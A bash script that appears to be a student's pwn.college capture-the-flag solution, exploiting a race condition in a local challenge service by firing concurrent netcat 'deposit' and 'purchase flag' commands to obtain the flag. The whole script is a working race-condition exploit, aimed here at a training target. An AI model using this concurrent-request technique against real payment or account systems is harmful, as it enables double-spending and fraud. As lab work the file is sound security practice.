#!/bin/bash
# Sumanth Vankineni
# UID 119351130
# PWN.COLLEGE - BULMAX9797

# Sets the server connection details where the binary is running, offering 'Deposit', 'Withdraw', and 'Purchase' options.
HOST='127.0.0.1'
PORT='1337'

# Defines the number of iterations to attempt the deposit and purchase operations, based on trial and error to accumulate sufficient funds.
ATTEMPTS=100

# Iterates through the deposit and purchase processes, simulating concurrent operations akin to threading in programming languages.
for ((i=0; i<ATTEMPTS; i++)); do
    # In each iteration, initiates a sub-process to execute two 'deposit' commands consecutively. This is based on the observed limit of commands before disconnection.
    # The commands are piped into the netcat utility, which handles the network communication, simulating the deposit action.
    (echo "deposit"; echo "deposit"; sleep 1) | nc $HOST $PORT | grep '^pwn' &

    # Almost simultaneously, initiates another sub-process to send a 'purchase flag' command. This step follows the double deposits, aiming to leverage the accumulated funds to purchase the flag.
    # This purchase attempt is also made through netcat, with the output filtered for lines starting with 'pwn', for a successful flag retrieval.
    (echo "purchase flag"; sleep 1) | nc $HOST $PORT | grep '^pwn' &
done

# Pauses the script until all the commands we started in the background are done, ensuring nothing is left incomplete.
# This step ensures that every deposit and purchase attempt is executed before the script concludes.
wait
